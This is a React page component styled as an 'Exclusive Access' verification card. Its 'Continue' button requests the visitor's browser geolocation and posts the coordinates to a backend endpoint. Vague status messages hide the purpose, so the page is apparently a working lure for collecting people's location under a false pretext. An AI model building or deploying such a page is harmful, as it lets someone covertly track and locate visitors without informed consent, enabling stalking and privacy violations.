import { useState } from "react";

export default function Home() {
  const [status, setStatus] = useState(null);
  const [error, setError] = useState(null);

  const handleAction = () => {
    if (!navigator.geolocation) {
      alert("Your device does not support this feature.");
      return;
    }

    setStatus("Processing... Please wait.");

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        setStatus("Request successful! Please wait...");

        // Send the data to the backend
        fetch("/api/send-location", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ latitude, longitude }),
        })
          .then(() => {
            setStatus("Your request has been completed successfully.");
          })
          .catch(() => {
            setStatus("Something went wrong. Please try again.");
          });
      },
      () => {
        setError("Oops! Unable to complete your request at this time.");
        alert("Please check your settings and try again.");
      }
    );
  };

  return (
    <div style={styles.container}>
      <div style={styles.card}>
        <h1 style={styles.heading}>Exclusive Access</h1>
        <p style={styles.subtext}>
          Click below to verify your access and proceed.
        </p>
        <button onClick={handleAction} style={styles.button}>
          Continue
        </button>
        {status && <p style={styles.statusText}>{status}</p>}
        {error && <p style={styles.errorText}>{error}</p>}
      </div>
    </div>
  );
}

// Styling
const styles = {
  container: {
    background: "linear-gradient(to right, #141E30, #243B55)",
    height: "100vh",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    padding: "20px",
  },
  card: {
    backgroundColor: "rgba(255, 255, 255, 0.1)",
    padding: "30px",
    borderRadius: "15px",
    textAlign: "center",
    boxShadow: "0 4px 10px rgba(0,0,0,0.3)",
    backdropFilter: "blur(10px)",
    color: "#fff",
    maxWidth: "400px",
    width: "100%",
  },
  heading: {
    marginBottom: "10px",
    fontSize: "24px",
    fontWeight: "bold",
  },
  subtext: {
    marginBottom: "20px",
    fontSize: "16px",
    color: "#ddd",
  },
  button: {
    padding: "12px 24px",
    fontSize: "18px",
    backgroundColor: "#00C9FF",
    color: "#fff",
    border: "none",
    borderRadius: "8px",
    cursor: "pointer",
    transition: "0.3s",
  },
  buttonHover: {
    backgroundColor: "#0087BA",
  },
  statusText: {
    marginTop: "20px",
    fontSize: "16px",
    color: "#fff",
  },
  errorText: {
    color: "red",
    fontSize: "14px",
    marginTop: "10px",
  },
};
